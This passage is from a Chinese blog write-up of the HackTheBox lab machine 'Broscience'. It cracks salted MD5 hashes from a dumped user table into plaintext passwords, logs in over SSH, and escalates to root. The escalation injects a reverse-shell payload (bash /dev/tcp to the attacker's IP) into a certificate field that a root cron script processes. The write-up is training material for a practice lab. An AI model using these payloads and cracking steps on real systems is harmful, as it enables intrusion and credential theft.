+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          </span><br><span class="line">----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------</span><br><span class="line">  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05</span><br><span class="line">  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04</span><br><span class="line">  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04</span><br><span class="line">  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04</span><br><span class="line">  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04</span><br><span class="line">(5 rows)</span><br></pre></td></tr></table></figure>
+<p>构造Hash如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">15657792073e8a843d4f91fc403454e1:NaCl</span><br><span class="line">13edad4932da9dbb57d9cd15b66ed104:NaCl</span><br><span class="line">bd3dad50e2d578ecba87d5fa15ca5f85:NaCl</span><br><span class="line">a7eed23a7be6fe0d765197b1027453fe:NaCl</span><br><span class="line">5d15340bded5b9395d5d14b9c21bc82b:NaCl</span><br></pre></td></tr></table></figure>
+<p>爆破Hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 20 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>得到如下凭证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bill:iluvhorsesandgym</span><br><span class="line">dmytro:Aaronthehottest</span><br><span class="line">michael:2applesplus2apples</span><br></pre></td></tr></table></figure>
+<p>尝试登入SSH服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh bill@10.10.11.195</span><br><span class="line">iluvhorsesandgym</span><br></pre></td></tr></table></figure>
+<p>登入成功，查看user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/bill/user.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8ca51558ef17c2ec059b606e71696280</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
+<p>传递pspy</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget 10.10.*.*/pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">./pspy64</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023&#x2F;03&#x2F;23 12:54:01 CMD: UID&#x3D;0     PID&#x3D;14400  | &#x2F;bin&#x2F;bash -c &#x2F;opt&#x2F;renew_cert.sh &#x2F;home&#x2F;bill&#x2F;Certs&#x2F;broscience.crt</span><br></pre></td></tr></table></figure>
+<p>查看<code>/opt/renew_cert.sh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/renew_cert.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 1 ] || [ <span class="variable">$1</span> == <span class="string">&quot;-h&quot;</span> ] || [ <span class="variable">$1</span> == <span class="string">&quot;--help&quot;</span> ] || [ <span class="variable">$1</span> == <span class="string">&quot;help&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> certificate.crt&quot;</span>;</span><br><span class="line">    <span class="built_in">exit</span> 0;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$1</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -checkend 86400 &gt; /dev/null</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;No need to renew yet.&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span> 1;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    subject=$(openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -subject | cut -d <span class="string">&quot;=&quot;</span> -f2-)</span><br><span class="line"></span><br><span class="line">    country=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;C = .&#123;2&#125;&#x27;</span>)</span><br><span class="line">    state=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;ST = .*,&#x27;</span>)</span><br><span class="line">    locality=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;L = .*,&#x27;</span>)</span><br><span class="line">    organization=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;O = .*,&#x27;</span>)</span><br><span class="line">    organizationUnit=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;OU = .*,&#x27;</span>)</span><br><span class="line">    commonName=$(<span class="built_in">echo</span> <span class="variable">$subject</span> | grep -Eo <span class="string">&#x27;CN = .*,?&#x27;</span>)</span><br><span class="line">    emailAddress=$(openssl x509 -<span class="keyword">in</span> <span class="variable">$1</span> -noout -email)</span><br><span class="line"></span><br><span class="line">    country=<span class="variable">$&#123;country:4&#125;</span></span><br><span class="line">    state=$(<span class="built_in">echo</span> <span class="variable">$&#123;state:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    locality=$(<span class="built_in">echo</span> <span class="variable">$&#123;locality:3&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    organization=$(<span class="built_in">echo</span> <span class="variable">$&#123;organization:4&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    organizationUnit=$(<span class="built_in">echo</span> <span class="variable">$&#123;organizationUnit:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    commonName=$(<span class="built_in">echo</span> <span class="variable">$&#123;commonName:5&#125;</span> | awk -F, <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$subject</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Country     =&gt; <span class="variable">$country</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;State       =&gt; <span class="variable">$state</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Locality    =&gt; <span class="variable">$locality</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Org Name    =&gt; <span class="variable">$organization</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Org Unit    =&gt; <span class="variable">$organizationUnit</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Common Name =&gt; <span class="variable">$commonName</span>&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Email       =&gt; <span class="variable">$emailAddress</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\nGenerating certificate...&quot;</span>;</span><br><span class="line">    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$country</span></span></span><br><span class="line"><span class="string">    <span class="variable">$state</span></span></span><br><span class="line"><span class="string">    <span class="variable">$locality</span></span></span><br><span class="line"><span class="string">    <span class="variable">$organization</span></span></span><br><span class="line"><span class="string">    <span class="variable">$organizationUnit</span></span></span><br><span class="line"><span class="string">    <span class="variable">$commonName</span></span></span><br><span class="line"><span class="string">    <span class="variable">$emailAddress</span></span></span><br><span class="line"><span class="string">    &quot;</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">    /bin/bash -c <span class="string">&quot;mv /tmp/temp.crt /home/bill/Certs/<span class="variable">$commonName</span>.crt&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>This is a bash script that takes a path to a certificate file as its argument and checks if the certificate needs to be renewed. If it needs to be renewed, it generates a new certificate with the same subject and places it in a specific directory.<br />
+Here’s a brief rundown of what the script does:</p>
+<ol>
+<li>The script checks if the correct number of arguments have been provided and prints a usage message if they haven’t.</li>
+<li>It then checks if the certificate file exists, and if it doesn’t, it prints an error message and exits.</li>
+<li>If the certificate file exists, the script checks if the certificate needs to be renewed by using the openssl command to check if the certificate is still valid for at least 24 hours (86400 seconds) using the -checkend option. If the certificate doesn’t need to be renewed, it prints a message and exits.</li>
+<li>If the certificate needs to be renewed, the script extracts the subject fields from the certificate using the openssl command and assigns them to variables for later use.</li>
+<li>The script then prints the subject fields to the console.</li>
+<li>It then generates a new certificate using the openssl command with the req subcommand to generate a self-signed certificate. The certificate is generated with a validity period of 365 days, a key length of 4096 bits, and the same subject fields as the original certificate.</li>
+<li>Finally, the script moves the newly generated certificate to a specific directory with the filename as the common name extracted from the subject of the original certificate, followed by the .crt extension.<br />
+– Generated By ChatGPT</li>
+</ol>
+</blockquote>
+<p>构造一个24小时后过期的证书</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/bfl.key -out /tmp/bfl.crt -days 1</span><br><span class="line">cp /tmp/bfl.crt /home/bill/Certs/broscience.crt</span><br></pre></td></tr></table></figure>
+<p>其中在<code>commonName</code>字段填入如下Payload <code>$(bash -i &gt;&amp; /dev/tcp/10.10.*.*/9995 0&gt;&amp;1)</code></p>
+<p>监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9995</span><br></pre></td></tr></table></figure>
+<p>执行计划任务触发反弹Shell</p>
+<p>查看root.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fc289e7710721538f1ae8054f35af549</span><br></pre></td></tr></table></figure>
+<hr />
+<p>一开始把5432端口的数据库当成Mysql了，弄半天连不上还以为是端口转发工具的问题，难绷</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>xXxYOLOxXx
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://yoloyolo.top/2023/03/24/HackTheBox-Broscience/" title="HackTheBox_Broscience">https://yoloyolo.top/2023/03/24/HackTheBox-Broscience/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pentest/" rel="tag"># Pentest</a>
+              <a href="/tags/HackTheBox/" rel="tag"># HackTheBox</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/21/HackTheBox-Investigation/" rel="prev" title="HackTheBox_Investigation">
+      <i class="fa fa-chevron-left"></i> HackTheBox_Investigation
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_broscience"><span class="nav-number">1.</span> <span class="nav-text"> HackTheBox_Broscience</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text"> 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 路径枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">1.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
+  <div class="site-description" itemprop="description">Explorer for unknown.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
